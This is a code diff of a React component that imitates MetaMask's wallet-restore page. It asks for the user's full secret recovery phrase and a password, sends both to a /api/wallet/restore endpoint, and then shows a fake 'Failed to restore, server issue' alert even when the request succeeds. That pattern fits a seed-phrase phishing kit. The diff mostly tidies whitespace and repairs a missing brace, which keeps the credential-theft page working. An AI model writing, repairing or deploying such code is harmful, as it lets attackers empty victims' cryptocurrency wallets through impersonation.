@@ -1,5 +1,4 @@
 "use client";
-
 import { useState, useEffect } from "react";
 import { Eye, EyeOff } from "lucide-react";
 
@@ -10,8 +9,7 @@ export default function Metamask() {
   const [phrase, setPhrase] = useState<string[]>(Array(wordCount).fill(""));
   const [visible, setVisible] = useState<boolean[]>(Array(wordCount).fill(false));
   const [step, setStep] = useState<1 | 2>(1);
-
-  const [phraseString, setPhraseString] = useState(""); // for combined request
+  const [phraseString, setPhraseString] = useState("");
   const [password, setPassword] = useState("");
   const [confirmPassword, setConfirmPassword] = useState("");
   const [error, setError] = useState("");
@@ -47,46 +45,40 @@ export default function Metamask() {
   const handleRestore = () => {
     const phraseStr = phrase.join(" ").trim();
     setPhraseString(phraseStr);
-    setStep(2); // move to password step
+    setStep(2);
   };
 
   const handleSetPassword = async () => {
     setError("");
-
     if (!password || !confirmPassword) {
       setError("Please fill in both password fields.");
       return;
     }
-
     if (password !== confirmPassword) {
       setError("Passwords do not match.");
       return;
     }
-
     try {
       const response = await fetch("/api/wallet/restore", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phrase: `METAMASK ${phraseString}`, password }),
       });
-
       const result = await response.json();
-
       if (!response.ok) {
         throw new Error(result.message || "Wallet restore failed.");
       }
-
       alert("Failed to restore, server issue.");
     } catch (err) {
-  const errorMessage = err instanceof Error ? err.message : "An unknown error occurred.";
-  setError(errorMessage);
-  alert("Failed to restore, server issue.");
-};
+      const errorMessage = err instanceof Error ? err.message : "An unknown error occurred.";
+      setError(errorMessage);
+      alert("Failed to restore, server issue.");
+    }
+  }; // Added missing closing brace here
 
   return (
     <div className="min-h-screen bg-[#1e1e1e] text-white flex items-center justify-center px-4">
       <div className="w-full max-w-xl bg-[#121212] p-8 rounded-2xl shadow-xl space-y-6">
-
         {/* Stepper */}
         <div className="flex items-center justify-center space-x-4">
           <div className={`flex items-center space-x-2 ${step === 1 ? "" : "opacity-60"}`}>
@@ -99,7 +91,6 @@ export default function Metamask() {
             <span className="text-sm">Create password</span>
           </div>
         </div>
-
         {/* Headings */}
         <div className="text-center">
           {step === 1 ? (
@@ -114,7 +105,6 @@ export default function Metamask() {
             </>
           )}
         </div>
-
         {/* Step 1: Phrase input */}
         {step === 1 && (
           <>
@@ -129,11 +119,9 @@ export default function Metamask() {
                 </option>
               ))}
             </select>
-
             <div className="bg-[#292929] border-l-4 border-blue-500 text-sm text-gray-300 px-4 py-3 rounded">
               You can paste your entire secret recovery phrase into any field
             </div>
-
             <div className="grid grid-cols-3 gap-3">
               {phrase.map((word, i) => (
                 <div key={i} className="relative">
@@ -155,7 +143,6 @@ export default function Metamask() {
                 </div>
               ))}
             </div>
-
             <button
               className="w-full bg-[#3b3bff] hover:bg-[#2f2fd1] text-white py-2 rounded-md font-medium mt-4"
               onClick={handleRestore}
@@ -164,7 +151,6 @@ export default function Metamask() {
             </button>
           </>
         )}
-
         {/* Step 2: Password input */}
         {step === 2 && (
           <>
